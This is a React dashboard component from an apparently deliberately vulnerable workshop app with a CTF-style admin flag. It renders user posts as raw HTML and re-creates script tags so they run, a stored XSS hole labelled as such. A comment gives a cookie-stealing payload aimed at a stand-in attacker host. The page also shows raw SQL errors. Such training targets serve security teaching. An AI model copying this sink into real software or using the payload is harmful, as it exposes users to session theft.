import React, { useState, useEffect, useRef } from "react";
import { getPosts, updatePost } from "../api.js";

// ==========================================================================
// VULNERABILITY: Stored Cross-Site Scripting (XSS)
// --------------------------------------------------------------------------
// Each user's "post" (their public note) is treated as trusted HTML and
// injected straight into the page with the raw `innerHTML` sink instead of
// being rendered as escaped text. Anything a user types is parsed as live
// markup and runs in every other visitor's browser.
//
// `innerHTML` normally will NOT execute <script> tags that it inserts, so we
// walk the freshly-injected DOM and re-create each <script> node — this is
// what lets a payload like:
//     <script>fetch('https://ATTACKER/?c='+document.cookie)</script>
// actually fire when someone views the community feed.
// ==========================================================================
function RawHtml({ html, className }) {
  const ref = useRef(null);

  useEffect(() => {
    const el = ref.current;
    if (!el) return;

    // Unsafe sink: user-controlled string dropped in as live HTML.
    el.innerHTML = html || "";

    // Re-inject <script> tags so they execute (innerHTML alone won't run them).
    el.querySelectorAll("script").forEach((oldScript) => {
      const newScript = document.createElement("script");
      for (const attr of oldScript.attributes) {
        newScript.setAttribute(attr.name, attr.value);
      }
      newScript.textContent = oldScript.textContent;
      oldScript.replaceWith(newScript);
    });
  }, [html]);

  return <div ref={ref} className={className} />;
}

export default function Dashboard({ user, onLogout }) {
  const [myPost, setMyPost] = useState(user.post || "");
  const [allPosts, setAllPosts] = useState([]);
  const [searchTerm, setSearchTerm] = useState("");
  const [activeQuery, setActiveQuery] = useState("");
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState("");
  const [successMsg, setSuccessMsg] = useState("");

  // Fetch posts from backend with optional search filter
  const loadPosts = async (query = "") => {
    try {
      setLoading(true);
      setError("");
      const data = await getPosts(query);
      setAllPosts(data);
      setActiveQuery(query);
    } catch (err) {
      setError(err.message || "Database error occurred");
      setAllPosts([]);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadPosts();
  }, []);

  // Update current user's message
  const handleSavePost = async (e) => {
    e.preventDefault();
    setSaving(true);
    setError("");
    setSuccessMsg("");

    try {
      await updatePost(user.id, myPost);
      user.post = myPost;
      setSuccessMsg("Your message was updated!");
      await loadPosts(activeQuery);
    } catch (err) {
      setError(err.message || "Failed to save message");
    } finally {
      setSaving(false);
    }
  };

  // Triggered when pressing Enter in search bar
  const handleSearchSubmit = (e) => {
    e.preventDefault();
    loadPosts(searchTerm);
  };

  // Reset search filter
  const handleClearSearch = () => {
    setSearchTerm("");
    loadPosts("");
  };

  return (
    <div className="dashboard-layout">
      {/* Top Navigation Bar */}
      <header className="navbar">
        <div className="navbar-container">
          <div className="brand">
            <span className="brand-logo">💬</span>
            <span className="brand-name">Community Board</span>
          </div>

          <div className="user-nav-actions">
            <div className="user-badge">
              <span className="user-avatar">
                {user.username.charAt(0).toUpperCase()}
              </span>
              <div className="user-info">
                <span className="username">{user.username}</span>
                <span className="user-id">ID: #{user.id}</span>
              </div>
            </div>
            <button className="btn btn-secondary btn-sm" onClick={onLogout}>
              Log Out
            </button>
          </div>
        </div>
      </header>

      {/* Main Content Area */}
      <main className="main-content">
        {/* Admin Banner */}
        {user.is_admin === 1 && (
          <div className="admin-banner">
            <div className="admin-banner-header">
              <span>🔓 Admin Access Granted</span>
            </div>
            <p className="flag">FLAG: workshop_flag_is_admin_bypass</p>
          </div>
        )}

        {/* Message Editor */}
        <section className="editor-card">
          <h2>Update Your Public Message</h2>
          <p className="subtext">
            Every account gets one public message displayed across the platform.
          </p>

          {successMsg && (
            <div className="alert alert-success">{successMsg}</div>
          )}

          <form onSubmit={handleSavePost}>
            <textarea
              className="message-textarea"
              rows="4"
              placeholder="What's on your mind? Type your message here..."
              value={myPost}
              onChange={(e) => setMyPost(e.target.value)}
            />
            <div className="editor-actions">
              <button
                className="btn btn-primary"
                type="submit"
                disabled={saving}
              >
                {saving ? "Publishing..." : "Update Message"}
              </button>
            </div>
          </form>
        </section>

        {/* Public Messages Feed Section */}
        <section className="feed-section">
          <div className="feed-header">
            <div>
              <h3>Community Messages</h3>
              <span className="feed-count">
                Showing {allPosts.length}{" "}
                {allPosts.length === 1 ? "result" : "results"}
              </span>
            </div>

            {/* Form submit triggers backend search on Enter */}
            <form onSubmit={handleSearchSubmit} className="search-wrapper">
              <input
                type="text"
                className="search-input"
                placeholder="🔍 Search username & hit Enter..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
              {searchTerm && (
                <button
                  type="button"
                  className="search-clear"
                  onClick={handleClearSearch}
                >
                  ✕
                </button>
              )}
            </form>
          </div>

          {/* Database & SQL Error Display Alert */}
          {error && (
            <div
              className="alert alert-danger"
              style={{ fontFamily: "monospace", wordBreak: "break-word" }}
            >
              <strong>SQL Error:</strong> {error}
            </div>
          )}

          {/* Posts List */}
          {loading ? (
            <div className="state-card">Searching community messages...</div>
          ) : allPosts.length === 0 && !error ? (
            <div className="state-card">
              {activeQuery
                ? `No users found matching "${activeQuery}"`
                : "No messages published yet."}
            </div>
          ) : ( 
            <div className="posts-grid">
              {allPosts
                .filter((item) => !!item.post)
                .map((item) => (
                  <article
                    key={item.id}
                    className={`post-card ${item.id === user.id ? "highlight-self" : ""}`}
                  >
                    <div className="post-header">
                      <div className="author-info">
                        <span className="author-avatar">
                          {item.username.charAt(0).toUpperCase()}
                        </span>
                        <div>
                          <strong className="author-name">
                            {item.username}
                            {item.id === user.id && (
                              <span className="self-tag">You</span>
                            )}
                          </strong>
                          <span className="author-id">User ID: #{item.id}</span>
                        </div>
                      </div>
                    </div>

                    {item.post ? (
                      // Renders the note as raw HTML — stored XSS sink.
                      <RawHtml className="post-content" html={item.post} />
                    ) : (
                      <p className="post-content">
                        <em className="empty-post">No message set yet.</em>
                      </p>
                    )}
                  </article>
                ))}
            </div>
          )}
        </section>
      </main>
    </div>
  );
}
